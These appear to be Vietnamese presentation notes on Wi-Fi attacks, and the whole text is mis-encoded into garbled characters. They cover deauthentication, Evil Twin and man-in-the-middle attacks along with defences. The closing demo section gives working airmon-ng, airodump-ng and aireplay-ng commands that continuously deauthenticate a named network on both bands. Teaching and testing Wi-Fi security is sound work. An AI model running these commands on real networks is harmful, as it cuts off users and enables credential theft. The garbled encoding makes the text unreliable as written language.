K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ s·ª≠ d·ª•ng Deauth Attack ƒë·ªÉ √©p c√°c thi·∫øt b·ªã m·ª•c ti√™u ng·∫Øt k·∫øt n·ªëi, sau ƒë√≥ khai th√°c c√°c g√≥i tin ƒë·ªÉ x√°c ƒë·ªãnh SSID b·ªã ·∫©n.

#### **üìå C√°ch th·ª±c hi·ªán**:
1. **G·ª≠i Deauth Attack** ƒë·∫øn thi·∫øt b·ªã m·ª•c ti√™u ‚Üí Thi·∫øt b·ªã s·∫Ω bu·ªôc ph·∫£i k·∫øt n·ªëi l·∫°i v·ªõi Wi-Fi.  
2. **B·∫Øt g√≥i tin Probe Request v√† Probe Response**: Khi thi·∫øt b·ªã t√¨m ki·∫øm l·∫°i Wi-Fi, n√≥ s·∫Ω g·ª≠i g√≥i Probe Request ch·ª©a SSID ƒë√£ l∆∞u tr∆∞·ªõc ƒë√≥.  
3. **X√°c ƒë·ªãnh SSID b·ªã ·∫©n**: B·∫±ng c√°ch ph√¢n t√≠ch c√°c g√≥i tin n√†y b·∫±ng c√¥ng c·ª• nh∆∞ `Wireshark` ho·∫∑c `aircrack-ng`, hacker c√≥ th·ªÉ l·∫•y ƒë∆∞·ª£c t√™n SSID ƒë√£ b·ªã ·∫©n.  
4. **K·∫øt h·ª£p Evil Twin Attack**: Sau khi c√≥ SSID, hacker c√≥ th·ªÉ t·∫°o m·ªôt AP gi·∫£ m·∫°o ƒë·ªÉ ƒë√°nh l·ª´a ng∆∞·ªùi d√πng k·∫øt n·ªëi v√†o.  

üîπ **Ch·ªëng l·∫°i SSID Cloaking Attack**:  
- K√≠ch ho·∫°t **802.11w Management Frame Protection (MFP)** ƒë·ªÉ ngƒÉn ch·∫∑n Deauth Attack.  
- S·ª≠ d·ª•ng **VPN** ƒë·ªÉ m√£ h√≥a l∆∞u l∆∞·ª£ng ngay c·∫£ khi k·∫øt n·ªëi v·ªõi Wi-Fi c√¥ng c·ªông.  
- Kh√¥ng k·∫øt n·ªëi v·ªõi m·∫°ng ·∫©n n·∫øu kh√¥ng th·ª±c s·ª± c·∫ßn thi·∫øt.  

---

### **4.2.2. Man-in-the-Middle (MiTM) v·ªõi Deauth Attack**  

#### üïµÔ∏è **Man-in-the-Middle (MiTM) l√† g√¨?**  
MiTM l√† m·ªôt cu·ªôc t·∫•n c√¥ng trong ƒë√≥ k·∫ª t·∫•n c√¥ng ch√®n m√¨nh v√†o gi·ªØa k·∫øt n·ªëi gi·ªØa hai b√™n ƒë·ªÉ nghe l√©n, thay ƒë·ªïi ho·∫∑c ch·∫∑n d·ªØ li·ªáu.

#### ‚öî **C√°ch k·∫øt h·ª£p Deauth Attack v·ªõi MiTM**  

##### **üìå K·ªãch b·∫£n th·ª±c t·∫ø**:  
1. **G√¢y gi√°n ƒëo·∫°n k·∫øt n·ªëi b·∫±ng Deauth Attack**  
   - G·ª≠i g√≥i Deauthentication ƒë·∫øn m·ªôt thi·∫øt b·ªã tr√™n m·∫°ng m·ª•c ti√™u ƒë·ªÉ ng·∫Øt k·∫øt n·ªëi n√≥ kh·ªèi Access Point th·∫≠t.  

2. **T·∫°o ƒëi·ªÉm truy c·∫≠p gi·∫£ (Evil Twin Attack)**  
   - Thi·∫øt l·∫≠p m·ªôt AP gi·∫£ c√≥ c√πng SSID v·ªõi AP th·∫≠t nh∆∞ng kh√¥ng c√≥ m·∫≠t kh·∫©u (ho·∫∑c s·ª≠ d·ª•ng WPA2 gi·∫£ m·∫°o).  
   - Khi ng∆∞·ªùi d√πng b·ªã ng·∫Øt k·∫øt n·ªëi, h·ªç c√≥ th·ªÉ v√¥ t√¨nh k·∫øt n·ªëi v√†o AP gi·∫£.  

3. **Th·ª±c hi·ªán MiTM Attack**  
   - Sau khi n·∫°n nh√¢n k·∫øt n·ªëi v√†o AP gi·∫£, hacker c√≥ th·ªÉ:
     - **Ch·∫∑n d·ªØ li·ªáu**: D√πng `Wireshark` ho·∫∑c `tcpdump` ƒë·ªÉ theo d√µi l∆∞u l∆∞·ª£ng.  
     - **Khai th√°c th√¥ng tin ƒëƒÉng nh·∫≠p**: D√πng `ettercap` ho·∫∑c `Bettercap` ƒë·ªÉ thu th·∫≠p th√¥ng tin t·ª´ c√°c phi√™n HTTP kh√¥ng m√£ h√≥a.  
     - **Ch·∫°y Attack SSL Strip**: N·∫øu ng∆∞·ªùi d√πng truy c·∫≠p m·ªôt trang web HTTP, hacker c√≥ th·ªÉ chuy·ªÉn h∆∞·ªõng h·ªç ƒë·∫øn m·ªôt trang gi·∫£ m·∫°o ƒë·ªÉ ƒë√°nh c·∫Øp m·∫≠t kh·∫©u.  

#### **üî• C√¥ng c·ª• s·ª≠ d·ª•ng**:
- `aircrack-ng` (Deauth Attack)  
- `hostapd` (T·∫°o AP gi·∫£)  
- `ettercap` ho·∫∑c `Bettercap` (Th·ª±c hi·ªán MiTM)  

---

## **4.3 ·ª®ng d·ª•ng h·ª£p ph√°p**  

### **Ki·ªÉm th·ª≠ b·∫£o m·∫≠t m·∫°ng Wi-Fi (Penetration Testing)**
- **M·ª•c ƒë√≠ch**: Gi√∫p ki·ªÉm tra ƒë·ªô an to√†n c·ªßa m·∫°ng kh√¥ng d√¢y b·∫±ng c√°ch m√¥ ph·ªèng m·ªôt cu·ªôc t·∫•n c√¥ng th·ª±c t·∫ø.  
- **C√°ch th·ª©c**: C√°c chuy√™n gia b·∫£o m·∫≠t c√≥ th·ªÉ s·ª≠ d·ª•ng Deauth attack ƒë·ªÉ x√°c ƒë·ªãnh xem h·ªá th·ªëng c√≥ d·ªÖ b·ªã t·∫•n c√¥ng hay kh√¥ng, t·ª´ ƒë√≥ ƒë∆∞a ra bi·ªán ph√°p kh·∫Øc ph·ª•c nh∆∞ k√≠ch ho·∫°t WPA3, b·∫£o v·ªá MAC Filtering ho·∫∑c IDS/IPS.  


### **Ki·ªÉm tra kh·∫£ nƒÉng ph·ª•c h·ªìi v√† b·∫£o v·ªá Wi-Fi (Resilience Testing)**  
- **M·ª•c ƒë√≠ch**: ƒê√°nh gi√° m·ª©c ƒë·ªô b·∫£o v·ªá c·ªßa h·ªá th·ªëng Wi-Fi tr∆∞·ªõc c√°c cu·ªôc t·∫•n c√¥ng t·ª´ b√™n ngo√†i.  
- **C√°ch th·ª©c**:  
  - M√¥ ph·ªèng m·ªôt cu·ªôc **Deauth Attack** tr√™n h·ªá th·ªëng Wi-Fi c·ªßa t·ªï ch·ª©c ƒë·ªÉ ki·ªÉm tra xem **c√°c bi·ªán ph√°p b·∫£o m·∫≠t c√≥ hi·ªáu qu·∫£ hay kh√¥ng**.  
  - N·∫øu h·ªá th·ªëng c√≥ **802.11w (MFP)** ho·∫∑c c√°c c∆° ch·∫ø b·∫£o m·∫≠t kh√°c, cu·ªôc t·∫•n c√¥ng s·∫Ω th·∫•t b·∫°i, ch·ª©ng minh m·∫°ng an to√†n.  
- **·ª®ng d·ª•ng th·ª±c t·∫ø**:  
  - **Ng√¢n h√†ng, t·ªï ch·ª©c t√†i ch√≠nh**: Ki·ªÉm tra kh·∫£ nƒÉng ch·ªãu ƒë·ª±ng c·ªßa m·∫°ng Wi-Fi tr∆∞·ªõc c√°c cu·ªôc t·∫•n c√¥ng.  
  - **C√¥ng ty c√¥ng ngh·ªá**: ƒê√°nh gi√° b·∫£o m·∫≠t h·ªá th·ªëng Wi-Fi tr∆∞·ªõc khi tri·ªÉn khai r·ªông r√£i.  

### **T·ªëi ∆∞u h√≥a h·ªá th·ªëng Wi-Fi**
- **M·ª•c ƒë√≠ch**: Trong m·ªôt s·ªë tr∆∞·ªùng h·ª£p, Deauth attack c√≥ th·ªÉ gi√∫p qu·∫£n tr·ªã vi√™n m·∫°ng ki·ªÉm tra hi·ªáu su·∫•t roaming (chuy·ªÉn v√πng) gi·ªØa c√°c Access Point.  
- **C√°ch th·ª©c**: B·∫±ng c√°ch g·ª≠i g√≥i deauth, ng∆∞·ªùi ta c√≥ th·ªÉ theo d√µi xem thi·∫øt b·ªã c√≥ nhanh ch√≥ng chuy·ªÉn sang m·ªôt AP m·∫°nh h∆°n hay kh√¥ng.  

### **H·ªó tr·ª£ b·∫£o m·∫≠t v·∫≠t l√Ω & ki·ªÉm so√°t thi·∫øt b·ªã tr√°i ph√©p**

- **M·ª•c ƒë√≠ch**: NgƒÉn ch·∫∑n ho·∫∑c ph√°t hi·ªán c√°c thi·∫øt b·ªã tr√°i ph√©p k·∫øt n·ªëi v√†o m·∫°ng Wi-Fi trong khu v·ª±c b·∫£o m·∫≠t cao nh∆∞ doanh nghi·ªáp, t·ªï ch·ª©c ch√≠nh ph·ªß, ph√≤ng nghi√™n c·ª©u.

**C√°ch th·ª©c:**  
- H·ªá th·ªëng b·∫£o m·∫≠t Wi-Fi c√≥ th·ªÉ s·ª≠ d·ª•ng Deauth Attack ƒë·ªÉ bu·ªôc ng·∫Øt k·∫øt n·ªëi c√°c thi·∫øt b·ªã kh√¥ng ƒë∆∞·ª£c ph√©p d·ª±a tr√™n danh s√°ch MAC Address h·ª£p l·ªá.  
- N·∫øu ph√°t hi·ªán m·ªôt thi·∫øt b·ªã l·∫° ƒëang k·∫øt n·ªëi v√†o m·∫°ng n·ªôi b·ªô, h·ªá th·ªëng s·∫Ω t·ª± ƒë·ªông g·ª≠i g√≥i Deauthentication ƒë·ªÉ ch·∫∑n k·∫øt n·ªëi.  

**·ª®ng d·ª•ng th·ª±c t·∫ø:**  
- **C√¥ng ty**: Ch·∫∑n c√°c thi·∫øt b·ªã c√° nh√¢n kh√¥ng ƒë∆∞·ª£c ph√©p truy c·∫≠p v√†o m·∫°ng doanh nghi·ªáp.  

**Ph√≤ng tr√°nh:**  
S·ª≠ d·ª•ng c√°c h·ªá th·ªëng b·∫£o m·∫≠t Wi-Fi chuy√™n nghi·ªáp c√≥ ch·ª©c nƒÉng **Intrusion Prevention System (IPS)** thay v√¨ d√πng Deauth Attack th·ªß c√¥ng.

---

## **Wi-Fi kh√¥ng an to√†n nh∆∞ ch√∫ng ta nghƒ© ‚Äì Nh·ªØng r·ªßi ro & C√°ch ph√≤ng tr√°nh**  

Wi-Fi l√† c√¥ng ngh·ªá ph·ªï bi·∫øn trong ƒë·ªùi s·ªëng hi·ªán ƒë·∫°i, nh∆∞ng th·ª±c t·∫ø n√≥ **kh√¥ng an to√†n nh∆∞ ch√∫ng ta t∆∞·ªüng**. Nh·ªØng cu·ªôc t·∫•n c√¥ng nh∆∞ **Deauth Attack, Evil Twin, Man-in-the-Middle (MiTM), WPA Handshake Capture**, v.v., c√≥ th·ªÉ d·ªÖ d√†ng ƒë√°nh c·∫Øp d·ªØ li·ªáu c·ªßa ng∆∞·ªùi d√πng n·∫øu kh√¥ng c√≥ bi·ªán ph√°p b·∫£o v·ªá ph√π h·ª£p.  

---

### **üìå V√¨ sao Wi-Fi kh√¥ng an to√†n?**  

üî¥ **D·ªÖ b·ªã t·∫•n c√¥ng Deauthentication** ‚Üí K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ bu·ªôc thi·∫øt b·ªã r·ªùi kh·ªèi m·∫°ng m·ªôt c√°ch d·ªÖ d√†ng b·∫±ng Deauth Attack.  
üî¥ **D·ªÖ b·ªã gi·∫£ m·∫°o AP (Evil Twin Attack)** ‚Üí M·ªôt Fake AP c√≥ th·ªÉ l·ª´a ng∆∞·ªùi d√πng k·∫øt n·ªëi v√† ƒë√°nh c·∫Øp d·ªØ li·ªáu.  
üî¥ **D·ªØ li·ªáu c√≥ th·ªÉ b·ªã ch·∫∑n (Sniffing & MiTM Attack)** ‚Üí Hacker c√≥ th·ªÉ ƒë·ªçc, ch·ªânh s·ª≠a d·ªØ li·ªáu n·∫øu ng∆∞·ªùi d√πng truy c·∫≠p HTTP thay v√¨ HTTPS.  
üî¥ **M·∫≠t kh·∫©u c√≥ th·ªÉ b·ªã b·∫ª kh√≥a** ‚Üí N·∫øu Wi-Fi d√πng **WPA2-PSK**, hacker c√≥ th·ªÉ thu th·∫≠p WPA Handshake v√† th·ª±c hi·ªán **Brute Force Attack** ƒë·ªÉ l·∫•y m·∫≠t kh·∫©u.  

---

### **üõ° C√°ch ph√≤ng tr√°nh t·∫•n c√¥ng Wi-Fi**  

‚úÖ **S·ª≠ d·ª•ng WPA3 thay v√¨ WPA2** ‚Üí WPA3 c√≥ b·∫£o v·ªá ch·ªëng l·∫°i c√°c cu·ªôc t·∫•n c√¥ng Deauth & Brute Force.  
‚úÖ **K√≠ch ho·∫°t 802.11w (Management Frame Protection - MFP)** ‚Üí NgƒÉn ch·∫∑n Deauth Attack.  
‚úÖ **Kh√¥ng k·∫øt n·ªëi v√†o Wi-Fi c√¥ng c·ªông** n·∫øu kh√¥ng c√≥ VPN.  
‚úÖ **Lu√¥n ki·ªÉm tra m·∫°ng tr∆∞·ªõc khi nh·∫≠p th√¥ng tin ƒëƒÉng nh·∫≠p** (tr√°nh Evil Twin Attack).  
‚úÖ **Ch·ªâ truy c·∫≠p c√°c trang web HTTPS** ƒë·ªÉ tr√°nh b·ªã MiTM Attack.  
‚úÖ **D√πng VPN ƒë·ªÉ m√£ h√≥a d·ªØ li·ªáu**, ngay c·∫£ khi ƒëang ·ªü m·∫°ng tin c·∫≠y.  
‚úÖ **ƒê·∫∑t m·∫≠t kh·∫©u Wi-Fi m·∫°nh** (d√†i, ph·ª©c t·∫°p, kh√¥ng d·ªÖ ƒëo√°n).  

---

### **üîé K·∫øt lu·∫≠n**  
> ‚ùó **Wi-Fi kh√¥ng an to√†n tuy·ªát ƒë·ªëi**. D√π s·ª≠ d·ª•ng m·∫°ng gia ƒë√¨nh hay Wi-Fi c√¥ng c·ªông, lu√¥n c√≥ nguy c∆° b·ªã t·∫•n c√¥ng.  
> ‚úÖ **Bi·ªán ph√°p b·∫£o v·ªá quan tr·ªçng nh·∫•t l√† s·ª≠ d·ª•ng VPN, HTTPS, WPA3 v√† tr√°nh Wi-Fi c√¥ng c·ªông kh√¥ng m√£ h√≥a.**  

# 5Ô∏è‚É£ Demo th·ª±c t·∫ø: T·∫•n c√¥ng Deauthentication (Ng∆∞·ªùi 5)
Chu·∫©n b·ªã m√¥i tr∆∞·ªùng (WiFi Adapter, Kali Linux, airodump-ng, aireplay-ng).
C√°ch t√¨m AP v√† client b·∫±ng airodump-ng.
G·ª≠i g√≥i deauth b·∫±ng aireplay-ng.
Ki·ªÉm tra k·∫øt qu·∫£: Client b·ªã m·∫•t k·∫øt n·ªëi v·ªõi WiFi.
H·ªèi ƒë√°p v·ªõi kh√°n gi·∫£.

## Setup

C√†i ƒë·∫∑t aircrack-ng:

![image](https://hackmd.io/_uploads/B1Iftu3oJe.png)

Ki·ªÉm tra c√°c adapter ƒëang c√≥: 

![image](https://hackmd.io/_uploads/SJkAOOhjye.png)

- `wlp0s20f3` (phy1): 2.4GHz/5GHz
- `wlx784476bf1924` (phy2): 2.4GHz

Ki·ªÉm tra c√°c mode kh·∫£ d·ª•ng: 

![image](https://hackmd.io/_uploads/Hk9_5_nsyx.png)

![image](https://hackmd.io/_uploads/HkFF5_2jJg.png)

--> C·∫£ 2 adapter ƒë·ªÅu c√≥ th·ªÉ ƒë∆∞a v·ªÅ mode monitor ƒë·ªÉ ti·∫øn h√†nh inject packet

## Attack

Th√¥ng th∆∞·ªùng, ta s·∫Ω t·∫Øt c√°c ti·∫øn tr√¨nh li√™n quan v·ªõi adapter:

```
airmon-ng check kill
```

![airmon-check-kill](https://hackmd.io/_uploads/r1GbjF3j1e.png)

Nh∆∞ng v·ªõi bƒÉng t·∫ßn 5GHz, khi t·∫Øt adapter th√¨ n√≥ s·∫Ω t·ª± xo√° Regulatory Domain:

```
iw reg get
```

![regulatory-domain-deleted](https://hackmd.io/_uploads/SkE7FYhiyl.png)

V√¨ th·∫ø ta s·∫Ω kh√¥ng d√πng l·ªánh ƒë√≥ ƒë·ªÉ ƒë·∫£m b·∫£o NetworkManager v·∫´n ho·∫°t ƒë·ªông:

![network-manager-still-working](https://hackmd.io/_uploads/rJJrttnjkx.png)

Khi check l·∫°i Regulatory Domain th√¨ v·∫´n gi·ªØ nguy√™n Country US:

![regulatory-domain-existed](https://hackmd.io/_uploads/Bk5BtYniyx.png)

> Gi·∫£i th√≠ch v·ªÅ regulatory-domain

L√∫c n√†y ta ti·∫øn h√†nh ƒë∆∞a c√°c adapter v·ªÅ mode monitor:

```
airmon-ng start wlp0s20f3
airmon-ng start wlx784476bf1924
```

![airmon-start-phy1](https://hackmd.io/_uploads/r1Fp9F3oye.png)

![airmon-start-phy2](https://hackmd.io/_uploads/BydR9Ynokg.png)

Ki·ªÉm tra l·∫°i c√°c adapter b·∫±ng l·ªánh `iwconfig`:

![iwconfig-check-after-switch-mode](https://hackmd.io/_uploads/rJz5tF2iyg.png)

> L·ªánh airmon-ng s·∫Ω th√™m ƒëu√¥i mon v√†o cu·ªëi t√™n adapter

Tr∆∞·ªõc ti√™n, ta ti·∫øn h√†nh deauth m·∫°ng 2.4GHz v·ªõi adapter `wlx784476bf1924` (phy2). ƒê·∫ßu ti√™n ta l·∫Øng nghe to√†n b·ªô m·∫°ng g·∫ßn ƒë√¢y:

```
airodump-ng wlx784476bf1924
```

![airodump-list-2.4ghz](https://hackmd.io/_uploads/r16x9tnjkx.png)

Th·∫•y wifi t√™n `Tri` v·ªõi BSSID l√† `30:60:0A:D9:7F:31` v√† ·ªü channel 6, do ƒë√≥ ta l·∫Øng nghe l·∫°i v·ªõi c√°c th√¥ng tin nh∆∞ tr√™n ƒë·ªÉ thi·∫øt l·∫≠p adapter v·ªõi t·∫ßn s·ªë (frequency) t∆∞∆°ng ·ª©ng channel 6:

```
airodump-ng --bssid 30:60:0A:D9:7F:31 -c 6 wlx784476bf1924
```

![airodump-list-2.4-Tri](https://hackmd.io/_uploads/rJz-9Fnokl.png)

M·ªü terminal kh√°c l√™n v√† l√∫c n√†y ta ti·∫øn h√†nh deauth wifi ƒë√≥ b·∫±ng c√¥ng c·ª• aireplay-ng
    
```
aireplay-ng -0 0 -a 30:60:0A:D9:7F:31 wlx784476bf1924
```

![aireplay-deauth-2.4](https://hackmd.io/_uploads/HkQK9FhsJx.png)

T∆∞∆°ng t·ª± v·ªõi bƒÉng t·∫ßng 5GHz nh∆∞ng l·∫ßn n√†y v·ªõi tham s·ªë `--band a`

```
airodump-ng --band a wlp0s20f3mon
```

![airodump-list-5ghz](https://hackmd.io/_uploads/rkpIiKnjJx.png)

V·ªõi ESSID l√† `Tri` v√† ƒë·ªãa ch·ªâ MAC kh√°c `30:60:0A:D9:7F:39` c≈©ng nh∆∞ channel kh√°c 36, ta ti·∫øn h√†nh listen v·ªõi c√°c tham s·ªë ƒë√≥ ƒë·ªÉ thi·∫øt l·∫≠p channel cho adapter:

```
airodump-ng --bssid 30:60:0A:D9:7F:39 -c 36 wlp0s20f3mon
```

![airodump-list-5-Tri](https://hackmd.io/_uploads/SkOsiY3okl.png)

Cu·ªëi c√πng ta ti·∫øn h√†nh deauth wifi Tri ·ªü bƒÉng t·∫ßn 5GHz:

```
aireplay-ng -0 0 -a 30:60:0A:D9:7F:39 wlp0s20f3mon
```

![image](https://hackmd.io/_uploads/BkUM3FnsJe.png)

V√¨ ƒë√¢y l√† adapter deauth bƒÉng t·∫ßng 5GHZ n√™n ph·∫£i ƒë·∫£m b·∫£o Regulatory Domain v·∫´n cho ph√©p inject deauth packet ·ªü channel 36:

```
iw phy phy1 info | grep -A 20 Frequencies
```

![image](https://hackmd.io/_uploads/S1GWaK2iJe.png)

Channel 36 c√≥ frequency l√† 5180, do ƒë√≥ ta s·∫Ω xem coi Regulatory Domain c√≥ cho ph√©p hay kh√¥ng:

```
iw reg get
```

![image](https://hackmd.io/_uploads/HyYHTYhske.png)

Ta kh√¥ng th·∫•y ch·ªØ PASSIVE-SCAN ·ªü frequency 5180MHz do ƒë√≥ vi·ªác deauth v·∫´n ƒë∆∞·ª£c th·ª±c hi·ªán b√¨nh th∆∞·ªùng
